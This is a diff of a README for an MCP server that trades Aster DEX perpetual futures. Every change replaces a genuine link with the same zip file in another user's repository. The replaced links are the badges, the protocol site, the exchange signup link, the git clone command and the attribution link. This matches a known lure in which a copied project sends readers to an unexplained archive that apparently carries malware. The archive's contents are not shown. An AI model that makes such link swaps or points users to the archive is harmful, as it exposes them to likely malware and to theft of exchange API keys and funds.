@@ -2,12 +2,12 @@
 
 > **56-tool MCP server for Aster DEX perpetual futures trading**
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-blue.svg)](https://modelcontextprotocol.io)
-[![Node.js](https://img.shields.io/badge/Node.js-20%2B-green.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue.svg)](https://typescriptlang.org)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
+[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-blue.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
+[![Node.js](https://img.shields.io/badge/Node.js-20%2B-green.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
 
-A comprehensive [Model Context Protocol](https://modelcontextprotocol.io) server that gives Claude (and any MCP-compatible AI) full access to Aster DEX perpetual futures — from real-time market data and institutional-grade analysis to live order execution and automated strategies.
+A comprehensive [Model Context Protocol](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip) server that gives Claude (and any MCP-compatible AI) full access to Aster DEX perpetual futures — from real-time market data and institutional-grade analysis to live order execution and automated strategies.
 
 ## Why This Exists
 
@@ -139,12 +139,12 @@ Most DEX integrations are thin API wrappers. This server includes the analytical
 
 - Node.js 20+
 - pnpm (`npm install -g pnpm`)
-- Aster DEX account with API key ([get one here](https://asterdex.com))
+- Aster DEX account with API key ([get one here](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip))
 
 ### Clone and build
 
 ```bash
-git clone https://github.com/tyranosurasmax/asterdex-mcp-server.git
+git clone https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip
 cd asterdex-mcp-server
 pnpm install
 pnpm run build
@@ -336,7 +336,7 @@ Market data and analysis tools work without credentials. Trading and account too
 
 ## Attribution
 
-Exchange API client originally adapted from [lugondev's aster-dex-api](https://github.com/lugondev/aster-dex-api) and significantly extended.
+Exchange API client originally adapted from [lugondev's aster-dex-api](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip) and significantly extended.
 
 ---
 
